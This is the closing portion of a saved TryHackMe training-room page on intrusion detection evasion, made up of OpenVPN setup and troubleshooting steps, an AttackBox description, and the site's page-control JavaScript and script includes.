+<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/mac_import.png"></li>
+<li class="mt-2">Select the configuration file you downloaded earlier.</li>
+<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/mac_connect.png"></li>
+</ol>
+</div>
+</div>
+<section class="text-left">
+<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/idsevasion#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
+<h5 class="mb-0 text-openvpn">Having Problems?</h5>
+</a>
+<div class="collapse" id="havingProblems">
+<ul class="mt-2 mb-0">
+<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
+<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
+<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
+<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
+<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
+<li>Have you restarted your VM?</li>
+<li>Is your OpenVPN up-to-date?</li>
+<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
+<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
+</ul>
+</div>
+</section>
+</div>
+</div>
+<div id="nav-attackbox">
+<div class="text-center">
+<h4>AttackBox</h4>
+<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
+</div>
+<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/idsevasion#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
+<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
+</div>
+</div>
+<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
+</div>
+</div>
+</div>
+</div>
+<script>
+
+    const navConnVPNEl = document.querySelector('#nav-openvpn')
+    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
+    const navConnOptions = document.querySelector('#slideout-conn-options')
+
+    const navConnBkBtn = document.querySelector('#slideout-bk')
+
+    function showVPNSteps() {
+        navConnOptions.style.display = 'none'
+        navConnVPNEl.style.display = 'block'
+        navConnBkBtn.style.display = 'block'
+    }
+
+    function showAttackBoxSteps() {
+        navConnOptions.style.display = 'none'
+        navConnAttackBoxEl.style.display = 'block'
+        navConnBkBtn.style.display = 'block'
+    }
+
+    function showSlideoutConnOptions() {
+        navConnVPNEl.style.display = 'none'
+        navConnAttackBoxEl.style.display = 'none'
+        navConnBkBtn.style.display = 'none'
+        navConnOptions.style.display = 'block'
+    }
+
+    function showAttackBoxBtnFromSlideout() {
+        $('#navConnModal').modal('toggle')
+        setTimeout(function() {
+            showAttackBoxBtnIntro()
+        }, 100)   
+    }
+
+  </script>
+</div><iframe id="_hjSafeContext_13165610" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Intrusion Detection_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
+<script src="./TryHackMe _ Intrusion Detection_files/notify.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/api-requests.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/events.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/underscore-min.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/apexcharts.min.js"></script> 
+<script src="./TryHackMe _ Intrusion Detection_files/chart.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/expire.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/sockets.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/faqSearch.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/certificate.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/utils.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/roomSpecific.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/confetti.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/videos.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/intro.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/prism.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/asciinema-player.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/magnific-popup.min.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/introjsLogic.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/logic.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/tasks.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/connection-status.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/glossary.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/room-mymachine.js"></script>
+<script src="./TryHackMe _ Intrusion Detection_files/heartbeat.js" defer=""></script>
+<script>
+
+    let height
+    $(window).scroll(function () { /* Function to make IP information sticky. */
+      if (height == undefined || height < 30) {
+        height = ($('#instance-info').offset().top)
+      }
+      let scroll = $(window).scrollTop()
+      if (((scroll >= (height + 150))) && height > 30) {
+        $("#instance-info").addClass('instance-sticky')
+      } else if ((scroll <= (height))) {
+        $("#instance-info").removeClass("instance-sticky")
+      }
+    })
+
+    const csrfToken = "3cvrNZii-4L0zgdexxNe80r7fSL91LqLfuqU"
+    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)
+
+    const roomCode = "idsevasion"
+    const simpleRoom = true 
+    const events = {"tickets":false}
+
+    let userObj = { 
+      subscribed: 1,
+      splitScreen: false,
+      path: "pentesting",
+      tutorial: {
+        rooms: true,
+        attackbox: true,
+        staticsite: true
+      },
+      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
+    }
+
+    const roomSettings = {
+      remAttackBoxBtn : false
+    };
+
+    const heartbeatInterval = 30;
+
+    const cloudEnabled = false 
+    let cloudObj
+
+    initRoom()
+    checkVideoTab()
+    if(!simpleRoom) showChart(roomCode)
+
+    checkRoomAwards(roomCode)
+
+    getRoomVotes()
+
+    displayStreakFreezeAwardedFromMemory();
+    
+    window.addEventListener('load', function () {
+      introjsInit(roomCode)
+    })
+
+  </script>
+
+
+<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="8FC48A00-A977-30A6-E7E9-0ABD7149D31C"></div></body></html>
